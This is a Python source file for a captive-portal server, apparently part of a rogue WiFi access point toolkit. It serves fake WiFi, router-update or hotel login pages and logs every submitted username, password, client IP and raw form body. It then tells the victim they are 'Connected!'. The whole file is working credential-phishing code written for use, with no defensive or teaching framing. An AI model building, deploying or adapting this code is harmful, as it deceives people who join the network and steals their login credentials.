"""
Captive portal HTTP server — serves fake login pages and captures credentials.
Runs on a separate port (80) using http.server, not Flask.
"""

import os
import json
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime


class CaptivePortalHandler(BaseHTTPRequestHandler):
    """HTTP request handler for captive portal."""

    def log_message(self, format, *args):
        """Suppress default logging."""
        pass

    def do_GET(self, *args, **kwargs):
        """Serve the selected captive portal template."""
        template_path = self.server.template_path
        try:
            with open(template_path, "r") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(content.encode())
        except FileNotFoundError:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body><h1>WiFi Login</h1><form method='POST' action='/login'>"
                             b"<input name='username' placeholder='Username'><br>"
                             b"<input name='password' type='password' placeholder='Password'><br>"
                             b"<button type='submit'>Connect</button></form></body></html>")

    def do_POST(self, *args, **kwargs):
        """Capture form submissions."""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace")
        params = parse_qs(body)

        cred = {
            "timestamp": datetime.now().isoformat(),
            "ip": self.client_address[0],
            "path": self.path,
            "username": params.get("username", params.get("email", [""]))[0],
            "password": params.get("password", params.get("pass", [""]))[0],
            "raw": body,
        }

        self.server.captured_creds.append(cred)
        if self.server.log_fn:
            self.server.log_fn("info", f"[captive] Credential captured from {cred['ip']}: {cred['username']}")

        # Redirect to a "success" page
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<html><body><h2>Connected!</h2><p>You are now connected to the network. "
                         b"You may close this page.</p></body></html>")


class CaptivePortal:
    """Manages the captive portal HTTP server."""

    TEMPLATES = {
        "wifi_login": "wifi_login.html",
        "router_update": "router_update.html",
        "hotel_login": "hotel_login.html",
    }

    def __init__(self, template_dir="templates/captive", log_fn=None):
        self.template_dir = template_dir
        self.log_fn = log_fn
        self.server = None
        self.thread = None
        self.running = False
        self.captured_creds = []

    def _log(self, level, message):
        if self.log_fn:
            self.log_fn(level, message)

    def start(self, listen_ip="192.168.4.1", port=80, template="wifi_login") -> bool:
        """Start the captive portal server."""
        if self.running:
            return True

        template_file = self.TEMPLATES.get(template, "wifi_login.html")
        template_path = os.path.join(self.template_dir, template_file)

        try:
            self.server = HTTPServer((listen_ip, port), CaptivePortalHandler)
            self.server.template_path = template_path
            self.server.captured_creds = self.captured_creds
            self.server.log_fn = self.log_fn

            self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.thread.start()
            self.running = True
            self._log("info", f"[captive] Portal started on {listen_ip}:{port} (template: {template})")
            return True
        except Exception as e:
            self._log("error", f"[captive] Failed to start portal: {e}")
            return False

    def stop(self):
        """Stop the captive portal server."""
        if self.server:
            self.server.shutdown()
            self.server = None
        self.running = False
        self._log("info", "[captive] Portal stopped")

    def get_captured_credentials(self) -> list:
        """Return all captured credentials."""
        return list(self.captured_creds)
